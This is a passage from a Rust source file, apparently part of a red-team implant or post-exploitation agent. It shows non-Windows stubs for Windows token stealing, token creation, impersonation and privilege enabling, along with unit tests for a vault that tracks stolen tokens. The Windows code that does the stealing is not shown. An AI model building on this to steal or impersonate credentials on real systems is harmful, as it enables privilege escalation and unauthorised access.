            unsafe { CloseHandle(proc_handle) };
        }

        result
    }
}

// ─── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
pub mod native {
    //! Stub implementations for non-Windows platforms.
    //!
    //! Token manipulation is a Windows-only capability.  These stubs allow the
    //! code to compile on Linux/macOS for cross-compile testing, but all
    //! operations return errors.

    use super::TokenEntry;

    /// Windows error code for "not supported".
    const ERROR_NOT_SUPPORTED: u32 = 50;

    /// Stub: always returns `Err`.
    pub fn steal_token(_target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn make_token(
        _domain: &str,
        _user: &str,
        _password: &str,
        _logon_type: u32,
    ) -> Result<TokenEntry, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn impersonate_token(_handle: usize) -> Result<(), u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn revert_to_self() -> Result<(), u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `false`.
    pub fn is_token_elevated(_handle: usize) -> bool {
        false
    }

    /// Stub: get current user identity.
    pub fn get_uid() -> Result<(bool, String), u32> {
        let user = std::env::var("USER").unwrap_or_else(|_| String::from("unknown"));
        Ok((false, format!("WORKGROUP\\{user}")))
    }

    /// Stub: always returns empty list.
    pub fn list_privileges() -> Result<Vec<(String, u32)>, u32> {
        Ok(Vec::new())
    }

    /// Stub: always returns `Err`.
    pub fn enable_privilege(_priv_name: &str) -> Result<bool, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: no-op.
    pub fn close_token_handle(_handle: usize) {}

    /// Stub: returns an empty list (token enumeration is Windows-only).
    pub fn list_found_tokens() -> Vec<super::FoundToken> {
        Vec::new()
    }
}

// ─── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn vault_add_and_get() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0x1234,
            domain_user: "DOMAIN\\user".to_string(),
            process_id: 100,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        let id = vault.add(entry);
        assert_eq!(id, 0);
        let got = vault.get(id);
        assert!(got.is_some());
        assert_eq!(got.map(|e| &e.domain_user).unwrap(), "DOMAIN\\user");
    }

    #[test]
    fn vault_remove() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0,
            domain_user: "A\\B".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        let id = vault.add(entry);
        assert!(vault.remove(id));
        assert!(vault.get(id).is_none());
        // Removing again returns false.
        assert!(!vault.remove(id));
    }

    #[test]
    fn vault_reuses_removed_slots() {
        let mut vault = TokenVault::new();
        let mk = |pid: u32| TokenEntry {
            handle: 0,
            domain_user: format!("D\\U{pid}"),
            process_id: pid,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        let id0 = vault.add(mk(0));
        let _id1 = vault.add(mk(1));
        vault.remove(id0);
        let id2 = vault.add(mk(2));
        // Should reuse slot 0.
        assert_eq!(id2, 0);
        assert_eq!(vault.get(id2).map(|e| e.process_id), Some(2));
    }

    #[test]
    fn vault_clear() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0,
            domain_user: "A\\B".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        vault.add(entry);
        vault.set_impersonating(Some(0));
        vault.clear();
        assert!(vault.is_empty());
        assert!(vault.impersonating().is_none());
    }

    #[test]
    fn vault_iter() {
        let mut vault = TokenVault::new();
        let mk = |pid: u32| TokenEntry {
            handle: 0,
            domain_user: format!("D\\U{pid}"),
            process_id: pid,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        vault.add(mk(10));
        vault.add(mk(20));
        vault.add(mk(30));
        vault.remove(1); // Remove middle.
        let ids: Vec<u32> = vault.iter().map(|(id, _)| id).collect();
        assert_eq!(ids, vec![0, 2]);
    }

    #[test]
    fn vault_impersonation_tracking() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0,
            domain_user: "A\\B".to_string(),
            process_id: 1,
            token_type: TokenType::MakeNetwork,
            credentials: None,
        };
        let id = vault.add(entry);
        assert!(!vault.is_impersonating(id));
        vault.set_impersonating(Some(id));
        assert!(vault.is_impersonating(id));
        assert_eq!(vault.impersonating(), Some(id));
        // Removing the impersonated token clears impersonation.
        vault.remove(id);
        assert!(vault.impersonating().is_none());
    }

    #[test]
    fn token_type_from_u32() {
        assert_eq!(TokenType::from_u32(0x1), Some(TokenType::Stolen));
        assert_eq!(TokenType::from_u32(0x2), Some(TokenType::MakeNetwork));
        assert_eq!(TokenType::from_u32(0x3), None);
    }

    #[test]
    fn vault_len_and_is_empty() {
        let mut vault = TokenVault::new();
        assert!(vault.is_empty());
        assert_eq!(vault.len(), 0);
        let entry = TokenEntry {
            handle: 0,
            domain_user: "D\\U".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        vault.add(entry);
        assert!(!vault.is_empty());
        assert_eq!(vault.len(), 1);
    }

    #[test]
    fn vault_get_nonexistent_returns_none() {
        let vault = TokenVault::new();
        assert!(vault.get(0).is_none());
        assert!(vault.get(999).is_none());
    }

    // ─── FoundToken / list_found_tokens ──────────────────────────────────────

    fn make_found(
        user: &str,
        token_type: u32,
        integrity: u32,
        imp: u32,
        handle: u32,
    ) -> FoundToken {
        FoundToken {
            domain_user: user.to_string(),
            process_id: 42,
            handle,
            integrity_level: integrity,
            impersonation_level: imp,
            token_type,
        }
    }

    #[test]
    fn found_token_fields_accessible() {
        let ft = make_found("DOMAIN\\user", 1, 8192, 0, 0x100);
        assert_eq!(ft.domain_user, "DOMAIN\\user");
        assert_eq!(ft.process_id, 42);
        assert_eq!(ft.handle, 0x100);
        assert_eq!(ft.integrity_level, 8192);
        assert_eq!(ft.impersonation_level, 0);
        assert_eq!(ft.token_type, 1);
    }

    #[test]
    fn list_found_tokens_stub_returns_empty_on_non_windows() {
        let tokens = native::list_found_tokens();
        // On non-Windows the stub always returns an empty vec.
        assert!(tokens.is_empty());
    }
}
